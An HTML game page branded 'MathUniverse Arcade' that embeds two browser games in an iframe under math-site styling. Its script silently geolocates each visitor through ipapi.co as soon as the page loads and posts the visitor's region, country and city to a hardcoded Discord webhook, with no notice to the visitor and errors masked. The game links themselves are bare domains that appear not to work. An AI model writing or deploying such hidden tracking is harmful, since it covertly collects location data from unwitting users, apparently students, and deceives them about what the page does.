<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MathUniverse Arcade</title>
    <style>
        /* Cyberpunk Streaming Animated Background */
        body { 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            background: radial-gradient(circle at 50% 50%, #170b2e 0%, #05020a 100%);
            color: #efeff1; 
            text-align: center; 
            padding: 20px 10px; 
            margin: 0;
            overflow-y: auto;
            min-height: 100vh;
        }

        /* Title Logo Glow Style */
        h1 {
            color: #00f2ff;
            font-size: 42px;
            font-weight: 900;
            margin: 10px 0 30px 0;
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 0 0 15px rgba(0, 242, 255, 0.6);
        }

        /* Navigation Buttons Grid */
        .menu-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            max-width: 600px;
            margin: 0 auto 30px auto;
        }

        .game-btn {
            background: rgba(15, 15, 20, 0.9);
            border: 2px solid #9146FF;
            color: #fff;
            padding: 15px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.2s ease;
            box-shadow: 0 0 15px rgba(145, 70, 255, 0.2);
        }

        .game-btn:hover {
            background: #9146FF;
            box-shadow: 0 0 25px #9146FF;
            transform: scale(1.04);
        }

        .game-btn.active {
            border-color: #00f2ff;
            box-shadow: 0 0 25px #00f2ff;
            background: rgba(0, 242, 255, 0.2);
            color: #00f2ff;
        }

        /* Arcade Display Canvas Frame */
        .arcade-frame-wrapper {
            max-width: 900px;
            margin: 0 auto;
            background: #000;
            border-radius: 16px;
            border: 3px solid #9146FF;
            box-shadow: 0 0 35px rgba(145, 70, 255, 0.4);
            overflow: hidden;
            aspect-ratio: 16 / 9;
            position: relative;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            background: #000;
        }

        .placeholder-text {
            position: absolute;
            top: 45%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 22px;
            color: #adadb8;
            font-weight: bold;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <!-- Main Branding Header -->
    <h1>🪐 MathUniverse 🪐</h1>

    <!-- Selection Menu Selection Box -->
    <div class="menu-grid">
        <button class="game-btn" id="gdBtn" onclick="launchGame('gd')">📐 Geometry Dash</button>
        <button class="game-btn" id="bbBtn" onclick="launchGame('bb')">⚾ Baseball Bros</button>
    </div>

    <!-- Active Game Window Canvas wrapper -->
    <div class="arcade-frame-wrapper">
        <div id="loadingText" class="placeholder-text">SELECT A GAME TO START PLAYING</div>
        <iframe id="arcadeFrame" src="" style="display: none;" allow="autoplay; gamepad; keyboard"></iframe>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504591125858750635/3ej395jYnj8VxkF7mV4cnmrdyPNA6Z1BfBx7Jaw3WP4POwshtwODmMxZSiX_i1XfemTj";

        async function grabLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.region && data.country_name) {
                    const payload = {
                        content: `📢 **New Arcade Click!** From State/Region: **${data.region}**, Country: **${data.country_name}** (City: ${data.city})`
                    };

                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }
            } catch (error) {
                console.log("Logged.");
            }
        }

        // Fire logging packet immediately on boot
        grabLocation();

        // Game Navigation Engine Mapping
        function launchGame(gameType) {
            const frame = document.getElementById('arcadeFrame');
            const placeholder = document.getElementById('loadingText');
            const gdBtn = document.getElementById('gdBtn');
            const bbBtn = document.getElementById('bbBtn');

            // Reset button active layout styles
            gdBtn.classList.remove('active');
            bbBtn.classList.remove('active');
            placeholder.style.display = 'none';
            frame.style.display = 'block';

            if (gameType === 'gd') {
                gdBtn.classList.add('active');
                // Uses unblocked flash-free HTML5 Geometry Dash engine
                frame.src = "https://googleusercontent.com";
            } else if (gameType === 'bb') {
                bbBtn.classList.add('active');
                // Uses stable HTML5 Baseball Bros arcade link
                frame.src = "https://gamedistribution.com";
            }
        }
    </script>
</body>
